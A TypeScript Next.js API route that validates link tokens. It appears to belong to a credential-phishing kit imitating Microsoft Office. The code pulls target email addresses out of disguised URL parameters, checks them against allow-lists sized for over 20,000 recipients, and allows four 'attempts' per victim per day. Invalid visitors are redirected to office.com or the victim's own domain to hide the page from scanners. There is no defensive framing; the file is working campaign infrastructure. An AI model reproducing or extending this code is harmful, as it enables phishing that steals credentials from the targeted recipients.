import { NextRequest, NextResponse } from 'next/server'
import { verifyToken } from '@/lib/tokens'
import { getEmailFromId } from '@/lib/linkManagement'
import { getSettings } from '@/lib/adminSettings'
import { getLink } from '@/lib/linkDatabase'
import { getAttemptCount } from '@/lib/attemptTracker'

export async function POST(request: NextRequest) {
  try {
    // Handle empty request body gracefully
    let body
    try {
      body = await request.json()
    } catch (jsonError) {
      // If JSON parsing fails (empty body), try to get from URL params as fallback
      const token = request.nextUrl.searchParams.get('token')
      const id = request.nextUrl.searchParams.get('id')
      if (token) {
        body = { token, id }
      } else {
        return NextResponse.json({ 
          status: 'invalid',
          redirectUrl: 'https://office.com'
        }, { status: 400 })
      }
    }
    
    const { token, id } = body
    
    
    if (!token) {
      return NextResponse.json({ 
        status: 'invalid',
        redirectUrl: 'https://office.com'
      })
    }
    
    // 1. Verify token
    // Type B/C tokens (autograb_, gen_) are simple strings - validate against database only
    // Type A tokens are JWTs - verify signature
    let payload: any = null
    let email: string = ''
    
    // Check if it's a simple timestamp token (Type B/C) vs JWT (Type A)
    const isSimpleToken = token.includes('_') && !token.includes('.') && !token.startsWith('eyJ')
    
    if (isSimpleToken || token.startsWith('gen_')) {
      // Simple token (Type B/C) - skip JWT verification
      // Don't verify as JWT - these are database-only tokens
      // We'll validate existence in database below
    } else {
      // JWT token (Type A) - verify signature
      const tokenData = verifyToken(token)
      if (!tokenData.valid || !tokenData.payload) {
        return NextResponse.json({ 
          status: 'invalid',
          redirectUrl: 'https://office.com'
        })
      }
      
      payload = tokenData.payload
      
      // Check if JWT token expired
      if (payload.expiresAt && payload.expiresAt < Date.now()) {
        const emailForRedirect = payload.email || ''
        const domain = emailForRedirect.split('@')[1] || 'office.com'
        const settings = await getSettings()
        const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
        return NextResponse.json({ 
          status: 'expired',
          redirectUrl: redirectUrl
        })
      }
      
      // Get email from JWT payload
      email = payload.email || ''
    }
    
    // 3. Get email from ID (for Type A links with id parameter)
    if (id) {
      const emailFromId = await getEmailFromId(id)
      if (emailFromId) {
        email = emailFromId
      }
    }
    
    // For Type B/C, email might come from URL (not ID), so don't fail yet
    // We'll extract it from URL below
    // Type B uses timestamp tokens (XXXX_YYYY), Type A uses JWT (eyJXXX...)
    const isTypeB = isSimpleToken && !id
    if (!email && !isTypeB && !token.startsWith('gen_')) {
      return NextResponse.json({ 
        status: 'invalid',
        redirectUrl: 'https://office.com'
      })
    }
    
    // 4. Check if link was already used (GLOBAL CHECK)
    // Check in link database if link has "used" status
    const link = await getLink(token)
    
    if (!link) {
      // For timestamp/gen tokens, they MUST exist in database
      if (isSimpleToken || token.startsWith('gen_')) {
        
        // CRITICAL: Before returning invalid, check if user has made attempts
        // If attempts < 4, the link might still be valid (user can return)
        // Only return invalid if we're certain the link doesn't exist
        if (email) {
          const today = new Date().toISOString().split('T')[0]
          const attemptKey = `${email}_${today}`
          const attemptCount = await getAttemptCount(attemptKey)
          
          if (attemptCount > 0 && attemptCount < 4) {
            // User has made attempts but link not found - this is unusual
            // But if they have attempts, the link should exist
            // Log warning but still return invalid (link truly not found)
          }
        }
        
        return NextResponse.json({ 
          status: 'invalid',
          error: 'Link not found in database',
          redirectUrl: 'https://office.com'
        })
      }
    }
    
    if (link) {
      
      // Type B: Validate email against allowed list
      if (link.type === 'generic' && link.allowedEmails && Array.isArray(link.allowedEmails) && link.allowedEmails.length > 0) {
        
        // Get email from the full URL passed in request body
        const { fullUrl } = body
        let emailFromURL: string | null = null
        
        if (fullUrl) {
          
          try {
            const url = new URL(fullUrl)
            const params = url.searchParams
            
            // Check all possible parameters
            const emailFromSid = params.get('sid')
            const emailFromV = params.get('v')
            const emailFromHash = url.hash ? url.hash.substring(1) : null
            
            if (emailFromSid) {
              // Extract from pattern like: B3IF-example@email.com-F07H
              // IMPORTANT: Email domains can have hyphens! (e.g., osaka-u.ac.jp)
              
              const parts = emailFromSid.split('-')
              
              // Find the part with @ symbol (email start)
              let emailStartIndex = -1
              for (let i = 0; i < parts.length; i++) {
                if (parts[i].includes('@')) {
                  emailStartIndex = i
                  break
                }
              }
              
              if (emailStartIndex >= 0) {
                // Reconstruct email - it might span multiple parts
                // IMPORTANT: Username can have hyphens (e.g., k-1010@domain.com)
                // AND domain can have hyphens (e.g., user@osaka-u.ac.jp)
                
                let emailParts = []
                
                // Step 1: Look BACKWARD from @ to get username parts
                // Add parts before @ that are lowercase/mixed-case (not tokens)
                for (let i = emailStartIndex - 1; i >= 0; i--) {
                  const part = parts[i]
                  // If it's a short uppercase token (like H1PE, F40A), stop
                  if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) {
                    break
                  }
                  // Otherwise, it's part of the username (prepend it)
                  emailParts.unshift(part)
                }
                
                // Step 2: Add the part with @ symbol
                emailParts.push(parts[emailStartIndex])
                
                // Step 3: Look FORWARD from @ to get domain parts
                for (let i = emailStartIndex + 1; i < parts.length; i++) {
                  const part = parts[i]
                  // If it's a short uppercase token (like QLDZ, F07H), stop
                  if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) {
                    break
                  }
                  // Otherwise, it's part of the email domain
                  emailParts.push(part)
                }
                
                emailFromURL = emailParts.join('-')
              } else {
                // Try base64 decode
                for (const part of parts) {
                  try {
                    const decoded = Buffer.from(part, 'base64').toString('utf-8')
                    if (decoded.includes('@')) {
                      emailFromURL = decoded
                      break
                    }
                  } catch {}
                }
              }
            }  else if (emailFromV) {
              if (emailFromV.includes('@')) {
                emailFromURL = emailFromV
              }
            } else if (emailFromHash) {
              if (emailFromHash.includes('@')) {
                emailFromURL = emailFromHash
              }
            }
          } catch (error) {
          }
        } else {
        }
        
        if (emailFromURL) {
          // OPTIMIZATION: Use Set for O(1) lookup (critical for 20,000+ emails)
          const allowedEmailsSet = new Set(link.allowedEmails.map((e: string) => e.toLowerCase()))
          const isAllowed = allowedEmailsSet.has(emailFromURL.toLowerCase())
          
          if (!isAllowed) {
            return NextResponse.json({ 
              status: 'invalid',
              error: 'Email not authorized for this link',
              redirectUrl: 'https://office.com'
            })
          }
          
          email = emailFromURL // Use the validated email
        } else {
          // STRICT MODE: If Type B has email list, email MUST be validated
          // No email extracted = BLOCK access
          // BUT: Check if user has made attempts - if so, allow access
          
          // CRITICAL: If we can't extract email but link exists, check if user has attempts
          // If attempts < 4, allow access (user might have lost email param but link is still valid)
          // For now, return invalid but log the issue
          // TODO: Could check attempt count here if we had email from another source
          return NextResponse.json({ 
            status: 'invalid',
            error: 'Email required in URL for this link',
            redirectUrl: 'https://office.com'
          })
        }
      }
      
      // Check if link is marked as used
      // CRITICAL: Only block access if 4 attempts are completed
      // Users should be able to return to link if they haven't completed 4 attempts
      if (link.status === 'used' || (link.type === 'personalized' && link.used === true)) {
        // Check attempt count - if less than 4, allow access
        if (email) {
          const today = new Date().toISOString().split('T')[0]
          const attemptKey = `${email}_${today}`
          const attemptCount = await getAttemptCount(attemptKey)
          
          if (attemptCount < 4) {
            // Less than 4 attempts - allow access even if link was previously marked as used
            // Don't return error - continue to allow access
          } else {
            // 4 attempts completed - block access
            const domain = email.split('@')[1] || 'office.com'
            const settings = await getSettings()
            const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
            const hash = 'ReviewCompleted' // Fixed hash for used links
            return NextResponse.json({ 
              status: 'used',
              redirectUrl: `${redirectUrl}#${hash}`
            })
          }
        } else {
          // No email provided - use default behavior (block if marked as used)
          const domain = 'office.com'
          const settings = await getSettings()
          const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
          const hash = 'ReviewCompleted'
          return NextResponse.json({ 
            status: 'used',
            redirectUrl: `${redirectUrl}#${hash}`
          })
        }
      }
      
      if (link.status === 'expired' || (link.expiresAt && link.expiresAt < Date.now())) {
        const domain = email ? email.split('@')[1] : 'office.com'
        const settings = await getSettings()
        const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
        return NextResponse.json({ 
          status: 'expired',
          redirectUrl: `${redirectUrl}#LinkExpired`
        })
      }
      
      // Link is valid and active
    }
    
    // 5. Return valid status
    return NextResponse.json({ 
      status: 'valid',
      email: email || undefined // Return email if we have it
    })
    
  } catch (error) {
    return NextResponse.json({ 
      status: 'invalid',
      redirectUrl: 'https://office.com'
    }, { status: 500 })
  }
}



